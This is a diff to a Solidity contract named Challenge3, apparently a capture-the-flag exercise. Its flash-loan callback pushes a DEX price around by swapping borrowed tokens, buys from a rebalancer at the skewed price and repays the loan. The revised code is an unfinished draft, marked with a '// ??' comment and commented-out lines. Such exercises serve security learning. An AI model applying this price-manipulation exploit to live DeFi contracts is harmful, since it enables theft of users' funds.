@@ -53,20 +53,20 @@ contract Challenge3 {
 
     // 2. The callback function the pool calls during flashLoan
     function onFlashLoan(address token, uint256 amount, bytes calldata data) external {
-        // Step A: Swap the  borrowed token for the other token on the DEX (Manipulate the price on the rebalancer)
+        uint256 quantityA = IERC20(tokenA).balanceOf(address(rebalancer));
+        // uint256 quantityB = IERC20(tokenB).balanceOf(address(rebalancer));
+
         IERC20(token).approve(address(dex), amount);
         dex.swap(token, amount);
 
-        // Step B: Swap back to the original token on the rebalancer
-        if (token == tokenA) {
-            IERC20(tokenB).approve(address(rebalancer), IERC20(tokenB).balanceOf(address(this)));
-            rebalancer.swapBForA(IERC20(tokenB).balanceOf(address(this)));
-        } else if (token == tokenB) {
-            IERC20(tokenA).approve(address(rebalancer), IERC20(tokenA).balanceOf(address(this)));
-            rebalancer.swapAForB(IERC20(tokenA).balanceOf(address(this)));
-        }
+        uint256 price = rebalancer.getPrice();
 
-        // Step C: Repay the flash loan
+        IERC20(tokenB).approve(address(rebalancer), quantityA * price / 1e18); // ??
+        rebalancer.swapBForA(quantityA * price / 1e18);
+
+        //IERC20(tokenB).approve(address(dex), IERC20(tokenB).balanceOf(address(this)));
+        //dex.swap(token, IERC20(tokenB).balanceOf(address(this)));
+
         IERC20(token).safeTransfer(msg.sender, amount);
     }
 }
